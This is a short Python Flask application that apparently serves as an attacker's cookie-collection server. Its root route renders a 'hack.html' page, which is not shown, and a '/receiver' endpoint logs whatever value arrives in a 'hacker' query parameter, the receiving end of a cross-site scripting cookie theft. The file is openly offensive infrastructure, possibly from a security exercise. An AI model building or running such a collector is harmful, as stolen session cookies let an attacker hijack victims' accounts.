from flask import Flask, request
from flask import render_template

app = Flask(__name__)

@app.route('/')
def hack():
    app.logger.debug("hack cookie...")
    return render_template('hack.html')


@app.route('/receiver', methods=['GET', 'POST'])
def get_cookies():
 cookieReceived = request.args.get('hacker')
 app.logger.debug(cookieReceived)
 return 'ok'

if __name__ == '__main__':
 app.run(debug=app.debug, threaded=True)